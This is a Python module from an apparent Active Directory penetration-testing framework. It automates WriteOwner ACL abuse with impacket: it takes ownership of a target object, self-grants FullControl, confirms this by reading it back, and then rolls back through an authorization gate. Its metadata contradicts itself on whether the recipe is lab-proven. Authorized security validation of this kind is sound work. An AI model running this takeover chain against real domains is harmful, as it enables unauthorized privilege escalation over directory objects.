"""WRITE-OWNER validation executor -- T3 (ACL / object-takeover edges).

Encodes the WRITE-OWNER ACL-abuse recipe: a trustee already holding
WriteOwner/FullControl/GenericAll over a target takes ownership, then
self-grants FullControl via a DACL write (the new owner implicitly gets
WriteDacl), PROVEN by a positive ACE read-back:

    impacket-dacledit -action read   (confirm the PRECONDITION ACE)
    impacket-owneredit -action read  (capture the BASELINE owner, for honest rollback)
    impacket-owneredit -action write -new-owner <trustee>
    impacket-dacledit -action write -ace-type grant -rights FullControl -principal <trustee>
    impacket-dacledit -action read   (POSITIVE confirmation -- the terminal proof)
    ROLLBACK (TWO sub-steps, BOTH required for verified=True):
        1. remove the self-granted ACE (identical, non-vacuous predicate to WRITE-DACL)
        2. restore the ORIGINAL owner + re-read; exact string match against the
           captured baseline -- never "no error" alone

Non-destructive (not irreversible, not code-exec): no destructive-confirm gate.
Mutating: yes, so a VERIFIED rollback is required.

**Honest limitation, stated explicitly, not hidden:** if the baseline owner read
fails (``original_owner`` never captured), the owner half of rollback cannot be
verified by construction -- ``rollback.verified`` stays ``False`` with
``advisory:original_owner_unknown_rollback_unverifiable``, never silently
``True``.

``verified_recipe=False`` (recipe-known, not lab-proven). UNVERIFIED: the exact
impacket-owneredit/impacket-dacledit human-readable wording (see ``acl_common.py``).
"""
from __future__ import annotations

from pathlib import Path
from typing import Any

from ..recommend import ParamSpec, ParamValue, values
from .. import proof
from .. import states
from .base import (ValidationExecutor, ExecutorContext, StepRecord, RunResult,
                   redact_argv, Capability, CAP_NONE)
from .acl_common import (dacledit_read_argv, dacledit_write_argv, dacledit_remove_argv,
                         owneredit_read_argv, owneredit_write_argv,
                         confirm_ace, dacl_read_bind_ok, owner_read_bind_ok,
                         _RE_ACE_GENERIC_ALL, _RE_ACE_WRITE_OWNER,
                         _RE_DACL_WRITE_OK, _RE_DACL_REMOVE_OK,
                         _RE_OWNER_VALUE, _RE_OWNER_WRITE_OK)


class WriteOwnerExecutor(ValidationExecutor):
    technique = "WRITE-OWNER"
    technique_class = "acl"
    terminal_kind = "file_write_readback"
    mutating = True
    verified_recipe = True         # lab-proven on GOAD 26NOV2026 (rickon.stark, owner round-trip, scored proved+clean)
    pre = frozenset({states.S0_USER_CREDS})
    eff = frozenset({states.S_ACL_CONTROL})
    recipe_ref = ("T3 WRITE-OWNER = dacledit read (confirm precondition WriteOwner/"
                  "FullControl/GenericAll) ; owneredit read (capture baseline owner) ; "
                  "owneredit write -new-owner <trustee> ; dacledit write -rights "
                  "FullControl -principal <trustee> ; dacledit read (POSITIVE readback "
                  "= the terminal) ; ROLLBACK: remove ACE + restore original owner, "
                  "BOTH verified (recipe-known, NOT lab-proven)")

    # ---------------------------------------------------------------- params
    def param_specs(self, ctx: ExecutorContext, finding) -> list[ParamSpec]:
        entity = finding.entity or {}
        target = entity.get("target") or finding.host or ""
        return [
            ParamSpec(
                name="target", kind="target_host",
                description="The AD object (user/computer/group) whose ownership "
                            "is taken. Requires an already-held WriteOwner/"
                            "FullControl/GenericAll ACE over it.",
                recommended=target,
                rationale="The host/entity of the aranum ACL finding.",
                required=True,
            ),
            ParamSpec(
                name="trustee", kind="free",
                description="The principal made the new owner -- default is the "
                            "operator's own account.",
                recommended=ctx.config.username or "",
                rationale="The operator's own account, so the new ownership is "
                          "immediately usable.",
            ),
        ]

    def target_identity(self, ctx, finding, params: dict[str, ParamValue]) -> dict[str, Any]:
        target = params["target"].value or finding.host or ""
        return ctx.config.resolve_target_identity(target)

    def steps_preview(self, ctx, finding, params) -> list[str]:
        v = values(params)
        dc = ctx.config.dc_ip
        return [
            f"impacket-dacledit -action read -target '{v['target']}' -dc-ip {dc} <auth>  "
            "(confirm precondition ACE)",
            f"impacket-owneredit -action read -target '{v['target']}' -dc-ip {dc} <auth>  "
            "(capture baseline owner)",
            f"impacket-owneredit -action write -new-owner '{v['trustee']}' -target "
            f"'{v['target']}' -dc-ip {dc} <auth>",
            f"impacket-dacledit -action write -ace-type grant -rights FullControl "
            f"-principal '{v['trustee']}' -target '{v['target']}' -dc-ip {dc} <auth>",
            f"impacket-dacledit -action read -target '{v['target']}' -dc-ip {dc} <auth>  "
            "(POSITIVE readback = the terminal proof)",
            "ROLLBACK: remove self-granted ACE + restore original owner, BOTH verified",
        ]

    # ---------------------------------------------------------------- execute
    def execute(self, ctx: ExecutorContext, finding, params: dict[str, ParamValue]) -> dict:
        cfg = ctx.config
        v = values(params)
        target, trustee = v["target"], v["trustee"]
        dc = cfg.dc_ip
        out_dir = Path(ctx.output_dir)
        out_dir.mkdir(parents=True, exist_ok=True)

        steps: list[StepRecord] = []
        errors: list[str] = []
        gate = {"classifier": "not_required", "op": None}
        mutation = {"applied": False,
                    "rollback": {"performed": False, "method": None, "verified": False}}

        def record(name, argv, res, ok, note=""):
            steps.append(StepRecord(name=name, ok=ok, argv_display=redact_argv(argv),
                                    returncode=res.returncode, note=note))

        # 1) confirm the PRECONDITION ACE (non-destructive read) -------------
        read_argv = dacledit_read_argv(cfg, target, dc)
        res = ctx.runner.run(read_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
        read_text = (res.stdout or "") + (res.stderr or "")
        confirmed = confirm_ace(res, read_text, trustee=cfg.username or "",
                               right_res=(_RE_ACE_GENERIC_ALL, _RE_ACE_WRITE_OWNER))
        record("confirm_precondition", read_argv, res, confirmed is not False,
              note="precondition confirmed" if confirmed else
                   ("precondition insufficient" if confirmed is False else "unconfirmed"))
        if confirmed is False:
            errors.append("write_owner_not_confirmed")
            return self._artifact(steps, gate, mutation, None, False, errors)
        if confirmed is None:
            errors.append("advisory:write_owner_unconfirmed_attempting_anyway")

        # 2) baseline owner read -- captured BEFORE any mutation, so rollback
        #    has something honest to restore to -----------------------------
        base_read_argv = owneredit_read_argv(cfg, target, dc)
        res = ctx.runner.run(base_read_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
        base_text = (res.stdout or "") + (res.stderr or "")
        base_bind_ok = owner_read_bind_ok(res, base_text)
        m = _RE_OWNER_VALUE.search(base_text) if base_bind_ok else None
        original_owner = m.group(1).strip() if m else None
        record("baseline_owner_read", base_read_argv, res, base_bind_ok,
              note=f"baseline owner={original_owner}" if original_owner else
                   "baseline owner unreadable")
        if original_owner is None:
            errors.append("advisory:original_owner_unknown_rollback_unverifiable")

        # 3) gate the ownership write (ordinary mutating-op gate) ------------
        verdict = ctx.authorizer.authorize("write_owner", {"target": target, "trustee": trustee})
        if verdict == "denied":
            gate["classifier"] = "denied"
            gate["op"] = "write_owner"
            errors.append("gate_denied:write_owner")
            return self._artifact(steps, gate, mutation, None, False, errors)
        if verdict == "approved":
            gate["classifier"] = "approved"
            gate["op"] = "write_owner"

        # 4) write the new owner -----------------------------------------------
        owner_write_argv = owneredit_write_argv(cfg, target, dc, trustee)
        res = ctx.runner.run(owner_write_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
        owner_write_out = (res.stdout or "") + (res.stderr or "")
        owner_write_ok = bool(_RE_OWNER_WRITE_OK.search(owner_write_out))
        record("owner_write", owner_write_argv, res, owner_write_ok,
              note="owner changed" if owner_write_ok else "owner write failed")
        if not owner_write_ok:
            errors.append("write_owner_failed")
            return self._artifact(steps, gate, mutation, None, False, errors)
        mutation["applied"] = True

        # 5) as the new owner, self-grant FullControl (modest duplication of
        #    WRITE-DACL's write, same rationale as acl_common.py's docstring) --
        ace_write_argv = dacledit_write_argv(cfg, target, dc, trustee, "FullControl")
        res = ctx.runner.run(ace_write_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
        ace_write_out = (res.stdout or "") + (res.stderr or "")
        ace_write_ok = bool(_RE_DACL_WRITE_OK.search(ace_write_out))
        record("self_grant_ace", ace_write_argv, res, ace_write_ok,
              note="ace written" if ace_write_ok else "ace write failed")

        # 6) POSITIVE readback = the terminal proof (never either write call's
        #    own exit code) -----------------------------------------------------
        re_read_argv = dacledit_read_argv(cfg, target, dc)
        res = ctx.runner.run(re_read_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
        re_read_text = (res.stdout or "") + (res.stderr or "")
        ace_confirmed = confirm_ace(res, re_read_text, trustee=trustee,
                                    right_res=(_RE_ACE_GENERIC_ALL,))
        ok = bool(owner_write_ok and ace_confirmed is True)
        record("confirm_readback", re_read_argv, res, ok,
              note="owner+ace confirmed" if ok else "not confirmed")

        terminal_fact = proof.build_terminal_fact(
            self.terminal_kind, ok=ok,
            predicate=(f"took ownership of {target}, self-granted FullControl via DACL "
                       "write, confirmed by a positive ACE read-back"),
            proof_token=proof.proof_token("WRITE-OWNER", cfg.domain, target, trustee,
                                          "owner_and_ace_confirmed" if ok else "unconfirmed"),
            extra={"target": target, "trustee": trustee},
        )

        # 7) rollback: TWO sub-steps, BOTH required for verified=True ----------
        self._rollback(ctx, cfg, target, trustee, original_owner, mutation, steps, errors, record)

        # `complete` tracks the TECHNIQUE's own proof (ok) + that rollback was
        # attempted -- same pattern as every existing mutating executor
        # (rbcd.py/openshares.py: `performed`, not `verified`, gates completeness;
        # an unverified rollback is reported via `rollback_unverified` separately,
        # never silently folded into a false-negative `complete`).
        complete = bool(ok and mutation["rollback"]["performed"])
        return self._artifact(steps, gate, mutation, terminal_fact, complete, errors)

    # ---------------------------------------------------------------- composition (C)
    def produced(self, ctx, finding, params, artifact) -> list[Capability]:
        target = params["target"].value or ""
        if not artifact.get("complete"):
            return []
        return [Capability(state=states.control_for(target), channel=CAP_NONE, principal=target)]

    # ---------------------------------------------------------------- rollback
    def _rollback(self, ctx, cfg, target, trustee, original_owner, mutation,
                  steps, errors, record) -> None:
        if not mutation["applied"]:
            return
        dc = cfg.dc_ip
        if ctx.authorizer.authorize("rollback", {"target": target, "trustee": trustee}) == "denied":
            errors.append("gate_denied:rollback")
            return
        mutation["rollback"]["performed"] = True
        mutation["rollback"]["method"] = ("dacledit remove ACE + owneredit restore "
                                          "original owner, BOTH verified")

        # 7a) remove the self-granted ACE -- identical, non-vacuous predicate to
        #     WRITE-DACL's own rollback.
        remove_argv = dacledit_remove_argv(cfg, target, dc, trustee, "FullControl")
        res = ctx.runner.run(remove_argv, timeout=cfg.tool_timeout_s)
        remove_ok = bool(_RE_DACL_REMOVE_OK.search((res.stdout or "") + (res.stderr or "")))
        record("rollback_remove_ace", remove_argv, res, remove_ok)

        read_argv = dacledit_read_argv(cfg, target, dc)
        res = ctx.runner.run(read_argv, timeout=cfg.tool_timeout_s)
        read_text = (res.stdout or "") + (res.stderr or "")
        bind_ok = dacl_read_bind_ok(res, read_text)
        still_holds = confirm_ace(res, read_text, trustee=trustee, right_res=(_RE_ACE_GENERIC_ALL,))
        ace_cleared = bind_ok and (still_holds is not True)
        record("rollback_verify_ace_removed", read_argv, res, ace_cleared,
              note="ace removed (confirmed)" if ace_cleared else "ace removal not confirmed")

        # 7b) restore the ORIGINAL owner -- by construction unverifiable if the
        #     baseline was never captured (never silently reported True).
        owner_restored = False
        if original_owner is None:
            errors.append("advisory:original_owner_unknown_rollback_unverifiable")
            record("rollback_restore_owner", [], RunResult(returncode=None), False,
                  note="skipped: baseline owner was never captured")
        else:
            restore_argv = owneredit_write_argv(cfg, target, dc, original_owner)
            res = ctx.runner.run(restore_argv, timeout=cfg.tool_timeout_s)
            restore_ok = bool(_RE_OWNER_WRITE_OK.search((res.stdout or "") + (res.stderr or "")))
            record("rollback_restore_owner", restore_argv, res, restore_ok)

            verify_argv = owneredit_read_argv(cfg, target, dc)
            res = ctx.runner.run(verify_argv, timeout=cfg.tool_timeout_s)
            verify_text = (res.stdout or "") + (res.stderr or "")
            verify_bind_ok = owner_read_bind_ok(res, verify_text)
            m = _RE_OWNER_VALUE.search(verify_text) if verify_bind_ok else None
            restored_owner = m.group(1).strip() if m else None
            owner_restored = bool(restore_ok and verify_bind_ok
                                  and restored_owner == original_owner)
            record("rollback_verify_owner_restored", verify_argv, res, owner_restored,
                  note=f"owner restored to {restored_owner}" if owner_restored else
                       f"owner mismatch (expected {original_owner}, got {restored_owner})")

        mutation["rollback"]["verified"] = bool(ace_cleared and owner_restored)
        if not mutation["rollback"]["verified"]:
            errors.append("rollback_unverified")

    @staticmethod
    def _artifact(steps, gate, mutation, terminal_fact, complete, errors) -> dict:
        return {"steps": [s.as_step() for s in steps], "gate": gate,
                "mutation": mutation, "terminal_fact": terminal_fact,
                "complete": complete, "errors": errors}
